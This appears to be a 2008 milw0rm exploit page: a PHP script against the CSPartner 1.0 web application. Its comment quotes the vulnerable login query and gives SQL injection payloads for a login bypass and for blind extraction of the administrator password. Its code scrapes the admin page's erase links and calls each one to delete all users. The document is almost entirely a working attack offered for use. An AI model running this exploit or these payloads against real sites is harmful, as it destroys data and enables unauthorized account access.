<html><head><title>CSPartner 1.0 (Delete All Users/SQL Injection) Remote Exploit</title></head><pre>&lt;?php

/*

   CSPartner 1.0 (Delete All Users/SQL Injection) Remote Exploit
   ----------------------------------------------------------------
   By StAkeR[at]hotmail[dot]it 
   http://www.easy-script.com/scripts-dl/cspartne-01.zip
   ----------------------------------------------------------------
   
   File gestion.php
   
   5. if(!empty($_POST[&quot;pseudo&quot;]) &amp;&amp; !empty($_POST[&quot;passe&quot;])){
   6. $sql  = &quot;SELECT * FROM $tblPartner where pseudo='&quot;.$_POST[&quot;pseudo&quot;].&quot;' AND password='&quot;.$_POST[&quot;passe&quot;].&quot;'&quot;;
   7. $resultat = mysql_db_query($mydbPartner, $sql);
   
   Blind SQL Injection or Login ByPass for you :P
   
   Examples: ($_POST['pseudo'] and $_POST['passe'])
   
  -1 ' or '1=1
  -2 ' or ascii(substring((select password from CSPartner where id=1),1,1))=[97]/*
  -3 and other :D
  
   
   
*/


error_reporting(0);

$host = $argv[1] or die(&quot;Usage: php [exploit.php] [http://localhost/cms]\n&quot;);

if(preg_match_all('/erase=(.+?)&quot;/',file_get_contents($host.'/admin/index.php'),$out))
{
  for($i=0;$i&lt;=count($out);$i++)
  {
    file_get_contents($host.'/admin/index.php?erase='.$out[1][$i]);
  }
    echo &quot;[-] All Users Deleted\n&quot;;
}
else
{
  echo &quot;[-] Exploit Failed!\n&quot;;
}

# milw0rm.com [2008-10-23]</pre></html>